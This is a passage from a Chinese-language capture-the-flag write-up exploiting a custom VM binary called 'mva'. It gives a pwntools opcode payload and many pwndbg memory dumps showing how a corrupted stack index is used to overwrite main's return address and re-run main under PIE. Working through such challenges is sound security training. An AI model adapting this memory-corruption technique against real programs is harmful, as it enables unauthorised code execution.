<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61368</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffcefc61368</span> ◂— <span class="number">0x564900f400f4</span> <span class="comment">/* v12[0x80000000000000f6] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffcefc61370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffcefc61378</span> —▸ <span class="number">0x56499559a100</span> ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffcefc61380</span> —▸ <span class="number">0x7ffcefc61480</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffcefc61388</span> ◂— <span class="number">0x39d2b6d7df852f00</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rbp <span class="number">0x7ffcefc61390</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>pro_base 成功泄露，leak 完毕，接下来需要覆盖 ret 再次执行 main：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pay =  push() <span class="comment"># 没什么用,只是为了调试而已</span></span><br><span class="line">pay += ldr(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xff</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">pay += pop(<span class="number">0</span>) + sh() + pop(<span class="number">1</span>) + sh()</span><br><span class="line">pay += ldr(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0xe</span>) + ldr(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">5</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">pay += mv(<span class="number">2</span>,<span class="number">0xf6</span>) + mv(<span class="number">3</span>,<span class="number">0xf7</span>) + mv(<span class="number">4</span>,<span class="number">0xf8</span>) + mv(<span class="number">5</span>,<span class="number">0xf9</span>) + push() </span><br><span class="line">pay += mv(<span class="number">1</span>,<span class="number">0</span>) + pop(<span class="number">1</span>) + pop(<span class="number">1</span>) + push()</span><br><span class="line">pay += ldr(<span class="number">0</span>,<span class="number">0x51</span>,<span class="number">0</span>) + pop(<span class="number">1</span>) + pop(<span class="number">1</span>) + push()</span><br><span class="line"></span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>-<span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br></pre></td></tr></table></figure>
<ul>
<li>4 个 ldr 和 4 个 mv 执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x80000000000000ff</span> <span class="comment">/* v9 */</span> </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0xff9165dcd4</span> <span class="comment">/* v10[start] */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x80000000</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第一次执行 pop ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x80000000000000fe</span> <span class="comment">/* v9=0x80000000000000fe */</span> </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0x56069165dcd4</span> <span class="comment">/* v10[0]=0x5606 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x80000000</span> </span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56066e9a3a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56066e9a404a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x5606</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: (<span class="number">0x80000000000000ff</span><span class="number">-1</span>)*<span class="number">2</span> <span class="comment">/* 注意&quot;[--v9]&quot;&quot; */</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="number">18446744073709552124</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="number">0x7ffd83e7d070</span>+<span class="number">18446744073709552124</span></span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">18446884800526013036</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: hex(<span class="number">18446884800526013036</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">&#x27;0x100007ffd83e7d26c&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d26c</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│       <span class="number">0x7ffd83e7d26c</span> ◂— <span class="number">0x83e7d37000005606</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│       <span class="number">0x7ffd83e7d274</span> ◂— <span class="number">0x5793bc0000007ffd</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbp<span class="number">-4</span> <span class="number">0x7ffd83e7d27c</span> ◂— <span class="number">0x93e7a31e</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二次执行 pop ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x80000000000000fd</span> <span class="comment">/* v9=0x80000000000000fd */</span> </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0x6e9a56069165dcd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x80000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56066e9a3a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56066e9a404a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x6e9a</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: (<span class="number">0x80000000000000fe</span><span class="number">-1</span>)*<span class="number">2</span> <span class="comment">/* 注意&quot;[--v9]&quot;&quot; */</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">18446744073709552122</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="number">0x7ffd83e7d070</span>+<span class="number">18446744073709552122</span></span><br><span class="line">Out[<span class="number">8</span>]: <span class="number">18446884800526013034</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: hex(<span class="number">18446884800526013034</span>)</span><br><span class="line">Out[<span class="number">9</span>]: <span class="string">&#x27;0x100007ffd83e7d26a&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d26a</span> </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│       <span class="number">0x7ffd83e7d26a</span> ◂— <span class="number">0xd370000056066e9a</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│       <span class="number">0x7ffd83e7d272</span> ◂— <span class="number">0xbc0000007ffd83e7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbp<span class="number">-6</span> <span class="number">0x7ffd83e7d27a</span> ◂— <span class="number">0x93e7a31e5793</span></span><br></pre></td></tr></table></figure>
<p>这里的操作证明了：可以通过 ldr mv 修改“v9”的方式使程序错误定位“v12[target]”，而入在 pop 时把错误数据写入“v10”，那么接下来的 push 输入的值“v10”就可以被控制，就可以利用这一点来覆盖程序的返回地址 </p>
<ul>
<li>4 个 ldr 和 4 个 mv 执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x800000000000010e</span> <span class="comment">/* v9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0x6e9a56069165dcd4</span> <span class="comment">/* v10[start] */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x800000000000010e</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: <span class="number">0x800000000000010e</span>*<span class="number">2</span></span><br><span class="line">Out[<span class="number">10</span>]: <span class="number">18446744073709552156</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="number">0x7ffd83e7d070</span>+<span class="number">18446744073709552156</span></span><br><span class="line">Out[<span class="number">11</span>]: <span class="number">18446884800526013068</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: hex(<span class="number">18446884800526013068</span>)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">&#x27;0x100007ffd83e7d28c&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d28c</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d28c</span> ◂— <span class="number">0xff1a62000007fa3</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d294</span> ◂— <span class="number">0x83e7d37800007fa3</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d29c</span> ◂— <span class="number">0x7ffd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d2a4</span> ◂— <span class="number">0x6e9a32aa00000001</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d2ac</span> ◂— <span class="number">0x6e9a3a7000005606</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d2b4</span> ◂— <span class="number">0x91fbed9200005606</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d2bc</span> ◂— <span class="number">0x6e9a310090176fc9</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d2c4</span> ◂— <span class="number">0x83e7d37000005606</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d28c</span><span class="number">-4</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d288</span> —▸ <span class="number">0x7fa30fd1d0b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d290</span> —▸ <span class="number">0x7fa30ff1a620</span> (_rtld_global_ro) ◂— <span class="number">0x50d1300000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d298</span> —▸ <span class="number">0x7ffd83e7d378</span> —▸ <span class="number">0x7ffd83e7f39d</span> ◂— <span class="number">0x4a470061766d2f2e</span> <span class="comment">/* &#x27;./mva&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d2a0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d2a8</span> —▸ <span class="number">0x56066e9a32aa</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>在 ldr mv 和配合下，程序成功通过“v9”定位到了返回地址，接下来就要进行覆盖了</p>
<ul>
<li>执行 push 进行第一次覆盖：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x800000000000010f</span> <span class="comment">/* v9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0x6e9a56069165dcd4</span> <span class="comment">/* v10[0]=0x5606 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x800000000000010e</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d28c</span><span class="number">-4</span> <span class="comment">/* 返回地址[0-1]被覆盖为&quot;0x5606&quot; */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d288</span> ◂— <span class="number">0x56060fd1d0b3</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d290</span> —▸ <span class="number">0x7fa30ff1a620</span> (_rtld_global_ro) ◂— <span class="number">0x50d1300000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d298</span> —▸ <span class="number">0x7ffd83e7d378</span> —▸ <span class="number">0x7ffd83e7f39d</span> ◂— <span class="number">0x4a470061766d2f2e</span> <span class="comment">/* &#x27;./mva&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行 push 进行第二次覆盖：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x800000000000010e</span> <span class="comment">/* v9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0xfd16e9a9165dcd4</span> <span class="comment">/* v10[0]=0x6e9a */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x800000000000010e</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d28c</span><span class="number">-4</span> <span class="comment">/* 返回地址[1-3]被覆盖为&quot;0x6e9a&quot; */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d288</span> ◂— <span class="number">0x56066e9ad0b3</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d290</span> —▸ <span class="number">0x7fa30ff1a620</span> (_rtld_global_ro) ◂— <span class="number">0x50d1300000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d298</span> —▸ <span class="number">0x7ffd83e7d378</span> —▸ <span class="number">0x7ffd83e7f39d</span> ◂— <span class="number">0x4a470061766d2f2e</span> <span class="comment">/* &#x27;./mva&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行 push 进行第三次覆盖：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d050</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d050</span> ◂— <span class="number">0x800000000000010d</span> <span class="comment">/* v9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d058</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d060</span> ◂— <span class="number">0xd0b351009165dcd4</span> <span class="comment">/* v10[0]=0x5100 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd83e7d068</span> ◂— <span class="number">0x800000000000010e</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffd83e7d070</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffd83e7d078</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffd83e7d080</span> —▸ <span class="number">0x7fa30ff1c700</span> —▸ <span class="number">0x7fa30ff1c190</span> —▸ <span class="number">0x56066e9a2000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffd83e7d088</span> —▸ <span class="number">0x7fa30feec680</span> ◂— <span class="number">0x7fa30feec680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd83e7d28c</span><span class="number">-4</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd83e7d288</span> —▸ <span class="number">0x56066e9a5100</span> ◂— <span class="number">0x14</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd83e7d290</span> —▸ <span class="number">0x7fa30ff1a620</span> (_rtld_global_ro) ◂— <span class="number">0x50d1300000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd83e7d298</span> —▸ <span class="number">0x7ffd83e7d378</span> —▸ <span class="number">0x7ffd83e7f39d</span> ◂— <span class="number">0x4a470061766d2f2e</span> <span class="comment">/* &#x27;./mva&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>成功覆盖 main 的返回地址，因为程序开了PIE，所以每次攻击都有很小的概率可以命中“start”（至于组成“start”各个部分，都是在程序中找的，先利用 ldr mv 进行定位，再用 pop 将其赋值给“v10”）</p>
